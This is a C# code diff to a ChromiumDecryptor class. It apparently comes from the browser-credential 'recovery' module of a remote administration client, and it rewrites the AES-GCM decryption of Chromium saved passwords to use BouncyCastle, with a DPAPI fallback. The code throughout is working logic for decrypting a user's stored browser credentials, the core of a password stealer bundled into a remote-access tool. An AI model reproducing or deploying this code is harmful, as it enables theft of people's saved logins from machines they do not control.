@@ -1,3 +1,7 @@
+using Org.BouncyCastle.Crypto;
+using Org.BouncyCastle.Crypto.Engines;
+using Org.BouncyCastle.Crypto.Modes;
+using Org.BouncyCastle.Crypto.Parameters;
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -8,7 +12,7 @@ using System.Text;
 namespace RemoteAdmin.Client.Recovery.Browsers
 {
     /// <summary>
-    /// Provides methods to decrypt Chromium credentials using native .NET cryptography.
+    /// Provides methods to decrypt Chromium credentials using BouncyCastle.
     /// </summary>
     public class ChromiumDecryptor
     {
@@ -38,95 +42,46 @@ namespace RemoteAdmin.Client.Recovery.Browsers
 
         public string Decrypt(string cipherText)
         {
-            try
+            var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
+            if (cipherText.StartsWith("v10") && _key != null)
             {
-                var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
-
-                if (cipherText.StartsWith("v10") && _key != null)
-                {
-                    return Encoding.UTF8.GetString(DecryptAesGcm(cipherTextBytes, _key, 3));
-                }
-
-                return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
+                return Encoding.UTF8.GetString(DecryptAesGcm(cipherTextBytes, _key, 3));
             }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Decryption failed: {ex.Message}");
-                return string.Empty;
-            }
-        }
-
-        public string Decrypt(byte[] cipherBytes)
-        {
-            try
-            {
-                // Check for v10 prefix (modern Chromium encryption)
-                if (cipherBytes != null && cipherBytes.Length > 3 &&
-                    cipherBytes[0] == 'v' && cipherBytes[1] == '1' && cipherBytes[2] == '0' && _key != null)
-                {
-                    return Encoding.UTF8.GetString(DecryptAesGcm(cipherBytes, _key, 3));
-                }
-
-                // Legacy DPAPI encryption
-                if (cipherBytes != null && cipherBytes.Length > 0)
-                {
-                    return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherBytes, null, DataProtectionScope.CurrentUser));
-                }
-
-                return string.Empty;
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"Decryption failed: {ex.Message}");
-                return string.Empty;
-            }
+            return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
         }
 
         private byte[] DecryptAesGcm(byte[] message, byte[] key, int nonSecretPayloadLength)
         {
-            // Native .NET AES-GCM implementation (requires .NET Core 3.0+ or .NET Standard 2.1+)
+            // TODO: Replace with .NET-own AES-GCM implementation in .NET Core 3.0+
+            const int KEY_BIT_SIZE = 256;
+            const int MAC_BIT_SIZE = 128;
             const int NONCE_BIT_SIZE = 96;
-            const int TAG_BIT_SIZE = 128;
 
-            if (key == null || key.Length != 32) // 256 bits
-                throw new ArgumentException("Key needs to be 256 bit!", nameof(key));
+            if (key == null || key.Length != KEY_BIT_SIZE / 8)
+                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
             if (message == null || message.Length == 0)
                 throw new ArgumentException("Message required!", nameof(message));
 
-            try
+            using (var cipherStream = new MemoryStream(message))
+            using (var cipherReader = new BinaryReader(cipherStream))
             {
-                using (var cipherStream = new MemoryStream(message))
-                using (var cipherReader = new BinaryReader(cipherStream))
+                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
+                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
+                var cipher = new GcmBlockCipher(new AesEngine());
+                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
+                cipher.Init(false, parameters);
+                var cipherText = cipherReader.ReadBytes(message.Length);
+                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
+                try
                 {
-                    // Skip the non-secret payload (e.g., "v10")
-                    var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
-
-                    // Read the nonce (12 bytes for GCM)
-                    var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
-
-                    // Read the ciphertext + tag
-                    var cipherText = cipherReader.ReadBytes((int)(message.Length - nonSecretPayloadLength - (NONCE_BIT_SIZE / 8)));
-
-                    // The last 16 bytes are the authentication tag
-                    var cipherTextWithoutTag = new byte[cipherText.Length - (TAG_BIT_SIZE / 8)];
-                    var tag = new byte[TAG_BIT_SIZE / 8];
-
-                    Array.Copy(cipherText, 0, cipherTextWithoutTag, 0, cipherTextWithoutTag.Length);
-                    Array.Copy(cipherText, cipherTextWithoutTag.Length, tag, 0, tag.Length);
-
-                    // Decrypt using AES-GCM
-                    using (var aesGcm = new AesGcm(key))
-                    {
-                        var plainText = new byte[cipherTextWithoutTag.Length];
-                        aesGcm.Decrypt(nonce, cipherTextWithoutTag, tag, plainText);
-                        return plainText;
-                    }
+                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
+                    cipher.DoFinal(plainText, len);
                 }
-            }
-            catch (Exception ex)
-            {
-                Debug.WriteLine($"AES-GCM decryption failed: {ex.Message}");
-                return null;
+                catch (InvalidCipherTextException)
+                {
+                    return null;
+                }
+                return plainText;
             }
         }
     }
